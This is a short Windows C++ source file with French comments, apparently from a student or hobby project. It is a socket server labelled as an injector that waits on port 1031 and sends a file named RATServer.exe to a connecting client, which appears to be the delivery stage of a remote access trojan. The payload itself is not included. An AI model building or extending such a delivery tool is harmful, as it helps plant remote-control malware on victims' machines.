/*********************************************************************
injecteurServer.cpp - Programme envoyant l'injecteur au client
écrit par: Pierre-Marc Laforest
Date: 2017-03-24
**********************************************************************/

#include <stdio.h>
#include <iostream>
#include <fstream>
#include <string>
#include "comClientServer.h"

#define PORT_NUMB 1031

using namespace std;

void main(int argc, char **argv)
{
	WORD wVersionRequested = MAKEWORD(1, 1);
	WSADATA wsaData;
	SOCKET      listenSocket, remoteSocket;
	int nRet;
	//short nPort;

	// Check for port argument
	if (argc != 1) {
		cout << "\nSyntax: injecteurServer.exe";
		cout << endl;
		return;
	}

	// Initialize WinSock and check version
	nRet = WSAStartup(wVersionRequested, &wsaData);
	if (wsaData.wVersion != wVersionRequested)
	{
		cout << "Wrong version";
		return;
	}

	server_initComAvecClient(PORT_NUMB, &listenSocket, &remoteSocket);
	envoiFichierParSocket("RATServer.exe", remoteSocket);
	fermerCom(&listenSocket);
	fermerCom(&remoteSocket);
	terminerCom();

}